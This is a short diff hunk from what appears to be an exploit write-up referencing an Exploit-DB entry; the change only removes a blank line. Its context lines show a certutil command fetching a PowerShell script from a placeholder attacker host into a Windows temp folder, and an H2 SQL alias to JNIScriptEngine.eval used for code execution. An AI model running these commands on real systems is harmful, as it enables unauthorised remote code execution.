@@ -37,7 +37,6 @@ certutil -urlcache -split -f http://ATTACKER:80/49382.ps1 C:/Windows/Temp/49382.
 CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
 ```
 
-
 ### References
 
 - https://www.exploit-db.com/exploits/49384
